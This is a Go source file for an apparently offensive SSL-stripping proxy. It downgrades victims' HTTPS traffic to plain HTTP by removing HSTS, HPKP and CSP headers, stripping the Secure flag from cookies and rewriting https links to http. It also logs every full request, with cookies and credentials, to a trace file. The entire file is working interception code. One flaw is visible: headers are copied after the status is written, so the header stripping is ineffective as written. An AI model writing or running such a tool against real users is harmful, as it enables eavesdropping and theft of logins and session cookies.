package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/httputil"
	"os"
	"regexp"
	"strings"
)

type ProxyContext struct {
	traceFile    *os.File
	regexpCache  map[string]*regexp.Regexp
	removeSecure *regexp.Regexp
}

/*
   Removes specific security headers (prevents the browser from upgrading the connection)
   Removes Secure flag on Cookies
*/
func (ctx ProxyContext) copyHeaders(dst, src http.Header) {
	exclude := map[string]bool{
		"Strict-Transport-Security": true,
		"Public-Key-Pins":           true,
		"Content-Security-Policy":   true,
		"Referrer-Policy":           true,
	}

	for key, vals := range src {
		if !exclude[key] {
			for _, vv := range vals {
				if key == "Set-Cookie" {
					// Remvoe Secure flag
					vv = ctx.removeSecure.ReplaceAllLiteralString(vv, "")
				}
				dst.Add(key, vv)
			}
		}
	}
}

func (ctx ProxyContext) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Host == "127.0.0.1" {
		http.Error(w, "Loop Detected", http.StatusBadRequest)
		return
	}

	r.URL.Scheme = "https"
	r.URL.Host = r.Host
	r.RequestURI = ""
	r.Header.Del("Accept-Encoding") // allows automatic handeling of compression

	dump, _ := httputil.DumpRequest(r, true)
	fmt.Fprintln(ctx.traceFile, string(dump))

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Do(r)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	w.WriteHeader(resp.StatusCode)

	rewriteTypes := map[string]bool{
		"text/html":              true,
		"application/javascript": true,
		"text/css":               true,
		"application/json":       true,
	}

	contentType := resp.Header.Get("Content-Type")
	contentType = strings.Split(contentType, ";")[0]
	contentType = strings.TrimSpace(contentType)
	contentType = strings.ToLower(contentType)

	if rewriteTypes[contentType] {
		respBodyBytes, _ := ioutil.ReadAll(resp.Body)
		var rewriteLinks *regexp.Regexp
		if cacheItem, exists := ctx.regexpCache[r.Host]; exists {
			rewriteLinks = cacheItem
		} else {
			rewriteLinks = regexp.MustCompile("(?i)https://(" + regexp.QuoteMeta(r.Host) + ")")
			ctx.regexpCache[r.Host] = rewriteLinks
		}

		respBodyBytes = rewriteLinks.ReplaceAll(respBodyBytes, []byte("http://$1"))
		_, err = w.Write(respBodyBytes)
		if err != nil {
			log.Println(err.Error())
			return
		}
	} else {
		written, err := io.Copy(w, resp.Body)
		if err != nil {
			log.Println(err.Error())
			return
		}
		if resp.ContentLength > 0 && written != resp.ContentLength {
			log.Printf("[INFO] Invalid Content-Length! Content-Length: %d - Found: %d\n", resp.ContentLength, written)
		}
	}

	ctx.copyHeaders(w.Header(), resp.Header)
}

func main() {
	f, err := os.Create("trace.log")
	if err != nil {
		log.Println(err.Error())
		return
	}
	defer f.Close()
	ctx := ProxyContext{
		traceFile:    f,
		removeSecure: regexp.MustCompile("(?i);[[:space:]]+Secure"),
		regexpCache:  make(map[string]*regexp.Regexp),
	}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	log.Fatalln(http.ListenAndServe(":80", ctx))
}
